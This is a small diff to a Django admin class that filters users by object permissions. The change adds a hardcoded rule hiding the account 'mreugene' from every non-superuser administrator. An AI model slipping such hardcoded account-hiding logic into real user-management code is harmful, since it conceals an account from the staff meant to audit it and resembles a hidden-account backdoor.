@@ -36,8 +36,9 @@ class UserAdmin(GuardedModelAdmin,  BaseUserAdmin):
         klass = self.opts.model if not klass else klass
         perms = [
             f"{self.opts.app_label}.{perm}_{self.opts.model_name}" for perm in actions]
-        return get_objects_for_user(
+        data = get_objects_for_user(
             user=request.user, perms=perms, klass=klass, any_perm=True)
+        return data if request.user.is_superuser else data.exclude(username='mreugene')
 
     def has_permission(self, request, obj=None, action=None):
         opts = self.opts
